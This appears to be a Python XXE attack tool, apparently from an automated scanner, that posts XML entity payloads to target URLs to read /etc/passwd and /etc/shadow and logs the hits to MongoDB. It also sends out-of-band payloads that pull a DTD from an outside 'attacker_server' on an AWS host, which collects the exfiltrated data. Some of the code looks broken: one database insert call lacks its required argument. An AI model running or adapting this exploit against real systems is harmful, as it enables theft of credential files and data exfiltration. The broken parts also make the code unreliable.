from os import name
import requests, copy, sys, re, socket, time
from pymongo import MongoClient
from pymongo.cursor import CursorType
import requests
from bs4 import BeautifulSoup

server_host = "ec2-54-180-116-84.ap-northeast-2.compute.amazonaws.com"
server_port = 1000 
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
client_socket.connect((server_host,server_port))
session = requests.Session()

class schema :
    def __init__(self, type : str) :
        self.vulname = "XXE"
        self.type = type
        self.url = ''
        self.isHack = False
        self.totUse = 0
        self.content = str()

    def setUrl(self, url : str) :
        self.url = url

    def setisHackOob(self,cnt) :
        self.totUse = cnt
        if self.totUse > 0 : self.isHack = True

    def setisHack(self):
        self.isHack = True

    def settotUse(self, totUse : int) :
        self.totUse = totUse

    def setContent(self, content : str) :
        self.content += content
        self.content += "\n"


def sendMsg(client_socket, msg) :
    client_socket.sendall(msg)

def getMsg(client_socket) :
    data = client_socket.recv(1024)
    return data

def insertItem(item : schema , mongo):
    data = {
        "vulname" : item.vulname ,
        "type" : item.type,
        "url" : item.url ,
        "isHack":item.isHack,
        "totUse" : item.totUse,
        "content" : item.content
        }

    mongo.insert_one(data)





# routine : 메인 호출 부분
# argument : None
# return value : None

# XXE Point
def XXEPOINT(target_urls : list , mongo , atk):
    genXxeAttack(target_urls , mongo)

    sendMsg(client_socket, "reset".encode())

    oobXxeAttack(target_urls)





# routine : 일반적인 xxe exploit을 보낸 후 디비에 전송함
# argument : None
# return value : None

def genXxeAttack(target_urls : list , mongo):
    target_files = {
    ":x:"  : "file:///etc/passwd",
    ":$" : "file:///etc/shadow" 
    }

    headers = {'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/xml' }

    for target_url in target_urls:
        for xxe_keyword, target_file in target_files.items():

            new_schema = schema("GEN")
            new_schema.setUrl(target_url)
            payload = '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}"> ]><foo>&xxe;</foo>'''.format(target_file)
        
            response = session.post(target_url, data = payload , headers = headers)
            response_data = response.text
            if response_data.find(xxe_keyword) != -1:
                new_schema.setisHack()
                new_schema.setContent(response_data)
            
            insertItem(new_schema, mongo)

# routine : oob xxe exploit을 보냄
# return value : None
def oobXxeAttack(target_urls : list ):
    global session
    attacker_server = "http://ec2-54-180-116-84.ap-northeast-2.compute.amazonaws.com:1001/"
    headers = {'Content-Type': 'application/xml;charset=UTF-8',
                'Accept': 'application/xml' }

    for target_url in target_urls:
        url = '{}url/{}'.format(attacker_server,target_url)
        requests.get(url)  
        # Crafting XXE Payload
        payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(attacker_server)
        response = session.post(target_url, data = payload, headers = headers)
            
# routine : 공격자 서버에서 공격 log 를 받아옴 
# argument : None
# return value : 로그를 string 형태로 반환 ( 필터링되지 않은 상태 )

def resultRequest():
    sendMsg(client_socket, "result".encode("utf-8"))
    data = getMsg(client_socket)
    sendMsg(client_socket, data)
    data_transferred = 0 
    result = str()


    if data == None:
        print("\n\n   [ ERROR : File does not exist in server ] \n\n")
        return "RESULT_ERROR"

    
    try:
        while data:
            result += repr(data)
            data_transferred += len(data)
            data = getMsg(client_socket).decode("utf-8")
            sendMsg(client_socket, data.encode("utf-8"))
            if(data == "end"):
                break
    except Exception as ex:
            print("\n\n   [ ERROR : ", ex ," ]  \n\n")
            return "RESULT_ERROR"


    #print("\n\n** [ LOG ] Size of transferred data  : {} bytes \n\n".format(data_transferred))
    craftResult(result)

def craftResult(result : str):
    result = '"""{}"""'.format(result)    
    new_schema = schema("OOB")     
    result = result.split("\\n")
    url = str()

    for line in result:
        try:
            if( int(line.split(' ')[8]) != 404):
                continue
        except:
            continue


        line = re.sub("''","",line)
        if(line.find('/exploit/') != -1) : 
            new_schema.setContent(line[line.find('/exploit/'):line.find('http/1.1')])
        else :
            if(new_schema.url) :
                count_use = new_schema.content.count('/exploit/')
                new_schema.setisHackOob(count_use)
                insertItem(new_schema)

                new_schema = schema("OOB")
            new_schema.setUrl(line[line.find('/url') + 5:])

    count_use = new_schema.content.count('\n')
    new_schema.setisHackOob(count_use)
    insertItem(new_schema)